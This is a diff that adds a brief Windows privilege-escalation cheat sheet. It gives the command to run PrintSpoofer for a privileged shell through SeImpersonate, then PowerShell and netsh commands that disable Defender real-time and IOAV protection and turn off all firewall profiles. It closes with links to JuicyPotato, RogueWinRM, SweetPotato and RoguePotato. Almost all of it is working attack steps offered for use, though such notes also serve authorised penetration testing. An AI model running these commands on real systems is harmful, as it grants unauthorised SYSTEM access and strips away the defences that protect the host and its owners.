@@ -1,0 +1,22 @@
+#Download Print Spoofer
+https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
+
+#Run Print Spoofer
+PrintSpoofer.exe -d 1 -c cmd
+
+
+
+#Disable Firewal and AV
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableIOAVProtection $true
+netsh advfirewall set allprofiles state off
+
+
+
+
+#other exploit to test with seimpersonate
+https://github.com/ohpe/juicy-potato
+
+https://github.com/antonioCoco/RogueWinRM
+https://github.com/CCob/SweetPotato
+https://github.com/antonioCoco/RoguePotato
